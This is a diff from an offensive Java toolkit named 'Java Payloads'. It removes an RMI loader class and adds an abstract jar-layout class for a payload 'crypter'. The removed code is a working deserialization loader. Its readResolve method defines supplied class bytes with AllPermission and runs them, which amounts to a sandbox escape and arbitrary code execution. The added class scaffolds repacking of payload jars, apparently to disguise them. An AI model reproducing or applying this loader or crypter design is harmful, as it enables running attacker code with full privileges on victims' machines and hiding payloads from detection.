@@ -1,7 +1,7 @@
 /*
  * Java Payloads.
  * 
- * Copyright (c) 2011 Michael 'mihi' Schierl
+ * Copyright (c) 2012 Michael 'mihi' Schierl
  * All rights reserved.
  * 
  * Redistribution and use in source and binary forms, with or without
@@ -32,43 +32,26 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.loader.rmi;
+package javapayload.crypter;
 
-import java.io.ObjectStreamException;
-import java.io.Serializable;
-import java.net.URL;
-import java.security.AllPermission;
-import java.security.CodeSource;
-import java.security.Permissions;
-import java.security.ProtectionDomain;
-import java.security.cert.Certificate;
+import java.util.jar.JarEntry;
+import java.util.jar.JarInputStream;
+import java.util.jar.JarOutputStream;
+import java.util.jar.Manifest;
 
-public class Loader extends ClassLoader implements Serializable {
+import javapayload.Module;
 
-	public byte[][] classes;
+public abstract class JarLayout extends Module {
 
-	public Object[] parameters;
-
-	public Object readResolve() throws ObjectStreamException {
-		try {
-			Class clazz = null;
-			for (int i = 0; i < classes.length; i++) {
-				Permissions permissions = new Permissions();
-				permissions.add(new AllPermission());
-				clazz = defineClass(null, classes[i], 0, classes[i].length, new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions));
-			}
-			clazz.getConstructor(new Class[] { Object[].class }).newInstance(new Object[] { parameters });
-		} catch (Throwable t) {
-			/* #JDK1.4 */try {
-				throw new RuntimeException(t);
-			} catch (NoSuchMethodError ex) /**/{
-				throw new RuntimeException(t.toString());
-			}
-		}
-		return null;
+	public JarLayout(String summary, String description) {
+		super(null, JarLayout.class, summary, description);
 	}
-	
-	public void go() throws ObjectStreamException {
-		readResolve();
+
+	public abstract void init(String[] parameters, Manifest manifest) throws Exception;
+
+	public abstract void addStubs(JarOutputStream jos, String cryptedLoaderClassName) throws Exception;
+
+	public boolean shouldInclude(JarEntry je, JarInputStream jis) throws Exception {
+		return true;
 	}
 }
